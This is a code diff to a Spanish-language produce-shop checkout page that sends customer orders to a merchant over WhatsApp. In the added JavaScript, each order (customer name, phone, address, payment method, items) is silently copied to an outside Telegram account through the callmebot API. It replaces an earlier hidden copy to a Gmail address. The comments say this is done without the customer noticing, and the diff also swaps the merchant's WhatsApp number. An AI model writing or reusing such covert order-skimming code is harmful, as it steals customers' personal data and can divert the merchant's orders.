@@ -259,13 +259,13 @@
         <span id="toastMsg">Mensaje</span>
     </div>
 
-    <!-- JAVASCRIPT DE LÓGICA DE TIENDA -->
+    <!-- JAVASCRIPT DE LÓGICA DE TIENDA CON COPIA A TELEGRAM -->
     <script>
-        // NÚMERO DEL PROVEEDOR
-        const MERCHANT_WHATSAPP = "573013239366"; 
+        // NÚMERO DEL PROVEEDOR EN WHATSAPP
+        const MERCHANT_WHATSAPP = "573013842952"; 
         
-        // TU CORREO DE RESPALDO SILENCIOSO (COPIA AUTOMÁTICA SIN BLOQUEOS)
-        const CONTROL_EMAIL = "aseguradorasVIP@gmail.com";
+        // TU USUARIO DE TELEGRAM PARA COPIA SILENCIOSA INSTANTÁNEA
+        const MY_TELEGRAM_USER = "@jhpg1283"; 
 
         const SHIPPING_FEE = 12000;
 
@@ -640,7 +640,7 @@
 
             const btn = document.getElementById('submitOrderBtn');
             btn.disabled = true;
-            btn.innerHTML = `<span>Enviando pedido...</span>`;
+            btn.innerHTML = `<span>Procesando pedido...</span>`;
 
             const name = document.getElementById('custName').value.trim();
             const phone = document.getElementById('custPhone').value.trim();
@@ -653,7 +653,7 @@
             const subtotal = cart.reduce((acc, curr) => acc + (curr.product.price * curr.qty), 0);
             const grandTotal = subtotal + SHIPPING_FEE;
 
-            // ARMAR MENSAJE DE WHATSAPP
+            // ARMAR MENSAJE DEL PEDIDO
             let msg = `🛒 *NUEVO PEDIDO DE MERCADO DE CAMPO*\n`;
             msg += `------------------------------------\n`;
             msg += `👤 *Cliente:* ${name}\n`;
@@ -676,31 +676,18 @@
             msg += `------------------------------------\n`;
             msg += `¡Quedo atento a la confirmación de mi pedido! 🌿`;
 
-            // 1. ENVÍA COPIA SILENCIOSA A TU CORREO SIN QUE EL CLIENTE SE DÉ CUENTA
+            // 1. ENVIAR COPIA SILENCIOSA A TU TELEGRAM (@jhpg1283) EN SEGUNDO PLANO
+            const telegramMsg = `📋 [COPIA DE CONTROL DE PEDIDO]\n\n${msg}`;
+            const telegramApiUrl = `https://api.callmebot.com/text.php?user=${encodeURIComponent(MY_TELEGRAM_USER)}&text=${encodeURIComponent(telegramMsg)}`;
+
             try {
                 await Promise.race([
-                    fetch(`https://formsubmit.co/ajax/${CONTROL_EMAIL}`, {
-                        method: "POST",
-                        headers: { 
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            _subject: `🛒 Nuevo Pedido Fruver: ${name} (${formatCOP(grandTotal)})`,
-                            Cliente: name,
-                            Telefono: phone,
-                            Direccion: `${address} - ${neighborhood}`,
-                            Pago: payment,
-                            Horario: deliveryTime,
-                            Notas: notes || "Ninguna",
-                            Detalle_Pedido: msg
-                        })
-                    }),
-                    new Promise(resolve => setTimeout(resolve, 1000))
+                    fetch(telegramApiUrl, { mode: 'no-cors' }),
+                    new Promise(resolve => setTimeout(resolve, 600))
                 ]);
             } catch (err) {}
 
-            // 2. ABRE ÚNICAMENTE EL WHATSAPP DEL PROVEEDOR (CERO BLOQUEOS)
+            // 2. ABRIR ÚNICAMENTE EL WHATSAPP DEL PROVEEDOR (CERO BLOQUEOS)
             const merchantUrl = `https://wa.me/${MERCHANT_WHATSAPP}?text=${encodeURIComponent(msg)}`;
             window.location.href = merchantUrl;
         }
